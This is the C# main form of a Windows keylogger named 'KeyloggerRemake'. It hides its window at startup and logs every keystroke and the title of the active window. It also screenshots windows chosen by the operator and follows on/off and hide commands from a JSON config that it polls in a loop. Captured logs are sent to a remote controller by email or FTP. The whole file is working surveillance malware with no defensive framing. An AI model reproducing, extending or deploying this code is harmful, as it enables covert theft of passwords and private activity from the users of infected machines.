using System;
using System.ComponentModel;
using System.Windows.Forms;
using System.Threading;

namespace KeyloggerRemake
{
    public partial class frmMain : Form
    {
        //Used to store the FTP settings
        private string strHost = "";
        private string strUser = "";
        private string strPass = "";

        //Used to store the email settings
        private static string strFromEmail, strEmailHost, strEmailPass;
        private static int intEmailPort;
        private string strReceipentUser = "";
        private string strScreenshotWindow = "";

        //Used to store the enable/disable settings
        private bool blTakeScreenshot;
        private bool blSpecificLogging;
        private bool blSendEmail;
        private bool blUploadFTP;

        //These two are set to values because they are checked on startup
        private bool blStartLog = false;
        private bool blHide = true;

        //Used to check if the Json is downloaded
        private bool blJSONdled = false;

        //Used to store the current log and its properties
        private classLog currentLog;

        //Used to store the object gaining the json and its values
        private static classJsonObj.classJson objJson;

        public frmMain()
        {
            InitializeComponent();

            doFirst();
        }

        private void doFirst()
        {
            objJson = classJsonObj.initializeObj();
            backgroundWorker1.RunWorkerAsync();
            Thread.Sleep(1000);
            tmrParseSettings.Start();
        }

        private void frmMain_Activated(object sender, EventArgs e)
        {
            checkHide(); //Checks if it needs to hide on startup
        }

        //Checks the status of the logger (Start/stop)
        private void checkStatus()
        {
            if (blJSONdled == true) //Once it's downloaded
            {
                if (blStartLog == true) //If the log has to start
                {
                    startLogging();
                }
                else //If not
                {
                    stopLogging();
                }
            }
        }

        //Checks if the program needs to hide 
        private void checkHide()
        {
            if (blHide == true) //If the program needs to hide
            {
                this.Hide();
            }
            else //If not
            {
                this.Show();
            }
        }

        //Gets the settings from the Json object that was serialized
        private void getSettings()
        {
            //Gets the FTP settings
            strHost = objJson.FTP.Host;
            strUser = objJson.FTP.User;
            strPass = objJson.FTP.Pass;

            //Gets the Email settings
            strEmailHost = objJson.Email.Host;
            strFromEmail = objJson.Email.FromEmail;
            intEmailPort = objJson.Email.Port;
            strEmailPass = objJson.Email.Pass;
            strReceipentUser = objJson.Email.ToEmail;
            strScreenshotWindow = objJson.Email.Window; //Used to check which window to screenshot and to specify logging, only works while email sending is enabled

            //Gets the Booleans for the program to function based on the Controller
            blTakeScreenshot = objJson.Check.TakeScreenshot;
            blSpecificLogging = objJson.Check.SpecificLogging;
            blSendEmail = objJson.Check.SendEmail;
            blUploadFTP = objJson.Check.UploadFTP;

            if (blStartLog != objJson.Check.Start) //Checks if the controller wants to start, but the logger hasn't started
            {
                blStartLog = objJson.Check.Start; //Sets the new value
                checkStatus(); //Start/Stop
            }

            if (blHide != objJson.Check.Hide) //Checks if the controller wants to hide, but the logger hasn't hidden
            {
                blHide = objJson.Check.Hide; //Sets the new value
                checkHide(); //Hide/Show
            }
        }

        //To start logging
        private void startLogging()
        {
            currentLog = new classLog(); //Instantiates the log
            statusChanger("Started"); //Indicates the log started

            tmrCheckKeys.Start(); //Starts checking for the keys
            tmrGetWindow.Start(); //Gets the current window and checks for further conditions
        }

        //To stop logging
        private void stopLogging()
        {
            statusChanger("Stopped"); //Indicates the log stopped

            tmrCheckKeys.Stop(); //Stops checking for keys
            tmrGetWindow.Stop(); //Stops checking the current window

            if (blSendEmail == true) //If the Controller wants to send an email
            {
                sendEmail(strReceipentUser); //Sends it to the receipient
            }

            if (blUploadFTP == true) //If the Controller wants to upload to FTP
            {
                currentLog.saveLog(strHost, strUser, strPass); //Saves the log locally using the credentials
            }

            //GC.Collect();
        }

        //To send the email
        private void sendEmail(string strReceipient)
        { //Takes in the receipient (From the Controller)
            classEmail.sendMsg(classEmail.getMsg(currentLog, strReceipentUser, strFromEmail), strFromEmail, strEmailPass, strEmailHost, intEmailPort);
            //Generates a mail message from the current log, receipient user, sender email (and their credentials, from the Controller), and sends it.
        }

        //Checks if the window needed for a screenshot is active
        private void checkSSWindow(string strScreenshotWindow)
        { //Takes in the receipient (From the window to screenshot)
            if (classScreenshot.detectSpecificWindow(strScreenshotWindow) == true)
            { //If the window is detected
                classScreenshot Screenshot = new classScreenshot(strScreenshotWindow);
                if (currentLog.screenshotExists(Screenshot.strScreenshotName) == false)
                { //If the screenshot wasn't previously made, done to avoid clashing
                    Screenshot.takeScreenshot(); //Takes a screenshot
                    currentLog.stkScreenshots.Enqueue(Screenshot); //Enqueues it onto the stack
                    txtLog.AppendText(currentLog.addToLog(Environment.NewLine + "Screenshot taken" + Environment.NewLine));
                }
            }
        }

        //To change status
        private void statusChanger(string Status)
        { //Takes in the status
            if (Status.Equals("Started")) //If the log has started
            {
                clearLog();

                txtLog.AppendText(currentLog.addToLog(currentLog.printStartedLog()));
            }
            else if (Status.Equals("Stopped")) //If the log has stopped
            {

                txtLog.AppendText(currentLog.addToLog(currentLog.printStoppedLog()));
            }
        }

        //Clears the textbox
        private void clearLog()
        {
            txtLog.Clear();
        }
        
        //Checks for the keys entered
        private void checkForKeys() //Effective, but, inefficient?
        {
            //Gets the current
            String strKey = "";
            strKey = classGetKeys.checkAlphabet()
                    + classGetKeys.checkExtraKeys()
                    + classGetKeys.checkExtraKeys()
                    + classGetKeys.checkMoreExtraKeys()
                    + classGetKeys.checkNumbersAndAbove()
                    + classGetKeys.checkNumpad();
          
            if ((blSpecificLogging == true) && (blSendEmail == true)) //If the Controller wants specific logging (And has send email selected)
            { 
                if (classScreenshot.detectSpecificWindow(strScreenshotWindow) == true)
                { //If the needed window is detected
                    txtLog.AppendText(currentLog.addToLog(strKey));
                }
            }
            else //If the Controller just want any logs
            {
                txtLog.AppendText(currentLog.addToLog(strKey));
            }
        }

        //Used to get a screenshot of the current window -- Not used
        /*private void currentWindowScreenshot()
        { 
            checkWindow(classGetUserInfo.strCurrentWindow);
        }*/

        //Constantly checks for the keys once log has started
        private void tmrCheckKeys_Tick(object sender, EventArgs e)
        {
            checkForKeys();
        }

        //Constantly checks for the current keys once log has started
        private void tmrGetWindow_Tick(object sender, EventArgs e)
        {
            classGetUserInfo.strCurrentWindow = classGetUserInfo.getActiveWindowTitle(); //Gets the current window

            if ((blSendEmail == true) && (blSpecificLogging == true)) //If the Controller wants specific logging (And has send email selected)
            {
                if (classScreenshot.detectSpecificWindow(strScreenshotWindow) == true)
                { //If the needed window is detected
                    txtCurrentWindow.Text = strScreenshotWindow;
                }
            }
            else //If the Controller just want any logs
            {
                txtCurrentWindow.Text = classGetUserInfo.strCurrentWindow;
            }

            if (blTakeScreenshot == true) //If the Controller wants to regularly take screenshots
            {
                checkSSWindow(strScreenshotWindow); //Tries to take a screenshot
            }
        }

        //Constantly gets the settings to stay up to date
        private void tmrParseSettings_Tick(object sender, EventArgs e)
        {
            getSettings();
        }

        //Gets the current window onto the log using the textbox to avoid spamming
        private void txtCurrentWindow_TextChanged(object sender, EventArgs e)
        {
            txtLog.AppendText(currentLog.addToLog(currentLog.printNewWindow()));
        }
        
        //Constantly deserializes the json for any updates
        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            while (true)
            {
                objJson = classJsonObj.initializeObj();

                if (blJSONdled == false) //If the json wasn't previously downloaded
                {
                    blJSONdled = true; //Indicate that it's downloaded
                }
            }          
        }
    }
}
